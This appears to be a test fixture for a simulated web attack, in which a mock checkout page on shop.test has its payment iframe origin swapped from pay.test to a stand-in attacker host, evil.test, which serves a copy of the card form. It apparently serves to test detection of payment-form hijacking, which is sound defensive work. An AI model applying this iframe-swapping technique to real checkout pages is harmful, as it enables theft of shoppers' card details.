// Attack: the card iframe now comes from a new origin.
import * as baseline from './baseline.js';

export function respond(ctx) {
  if (ctx.host === 'shop.test' && ctx.path === '/checkout') {
    const body = baseline.pages['/checkout'](ctx).replace(ctx.origin('pay.test'), ctx.origin('evil.test'));
    return { headers: baseline.headers, body };
  }
  if (ctx.host === 'evil.test' && ctx.path === '/card') return { body: baseline.assets['pay.test']['/card'](ctx) };
  return baseline.respond(ctx);
}
